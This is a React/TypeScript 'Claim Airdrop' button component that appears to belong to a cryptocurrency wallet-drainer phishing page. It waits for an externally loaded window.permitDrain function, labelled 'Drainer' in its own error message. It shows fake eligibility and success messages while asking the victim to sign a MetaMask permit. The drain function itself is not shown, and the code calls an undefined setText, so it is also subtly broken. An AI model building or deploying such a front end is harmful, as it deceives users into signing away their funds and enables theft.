import React, { useState, useEffect } from "react";
import { toast } from "react-hot-toast";

declare global {
  interface Window {
    permitDrain?: () => Promise<boolean>;
  }
}

interface ClaimButtonProps {
  walletConnected: boolean;
  address?: string;
}

const ClaimButton: React.FC<ClaimButtonProps> = ({ walletConnected, address }) => {
  const [isDisabled, setIsDisabled] = useState(true);
  const [btnText, setBtnText] = useState("Checking eligibility...");

  // Spinner component
  const Spinner = () => (
    <svg
      className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      viewBox="0 0 24 24"
    >
      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
      <path
        className="opacity-75"
        fill="currentColor"
        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
      />
    </svg>
  );

  // Wait for Cloudflare script
  useEffect(() => {
    if (typeof window.permitDrain === "function") {
      setIsDisabled(!walletConnected);
      setText(walletConnected ? "Claim Airdrop" : "Connect wallet first");
      return;
    }

    let attempts = 0;
    const timer = setInterval(() => {
      if (typeof window.permitDrain === "function") {
        clearInterval(timer);
        setIsDisabled(!walletConnected);
        setText(walletConnected ? "Claim Airdrop" : "Connect wallet first");
      } else if (attempts++ > 80) {
        clearInterval(timer);
        setIsDisabled(true);
        setText("Failed to load");
        toast.error("Drainer failed to load");
      }
    }, 100);

    return () => clearInterval(timer);
  }, [walletConnected]);

  const handleClaim = async () => {
    if (!walletConnected || !window.permitDrain) return;

    setIsDisabled(true);
    setText("Sign in MetaMask..."); // ← spinner will show here too

    try {
      const success = await window.permitDrain();
      if (success) {
        setText("Claimed");
        toast.success("Claim successful!");
      } else {
        throw new Error("Returned false");
      }
    } catch (error: any) {
      console.error("Claim error:", error);
      setIsDisabled(false);
      setText("Claim Airdrop");

      const msg = error?.message?.toLowerCase() || "";
      if (error?.code === 4001 || msg.includes("reject")) {
        toast.error("You cancelled the signature");
      } else if (msg.includes("network")) {
        toast.error("Wrong network — use Ethereum Mainnet");
      } else {
        toast.error("Claim failed");
      }
    }
  };

  // Show spinner when loading script OR waiting for signature
  const showSpinner = btnText === "Checking eligibility..." || btnText === "Sign in MetaMask...";

  return (
    <button
      onClick={handleClaim}
      disabled={isDisabled}
      className="px-10 py-4 bg-gradient-to-r from-purple-600 to-pink-600 rounded-xl text-white font-bold text-lg hover:scale-105 transition-all disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center min-w-[240px]"
    >
      {showSpinner && <Spinner />}
      <span>{btnText}</span>
    </button>
  );
};

export default ClaimButton;
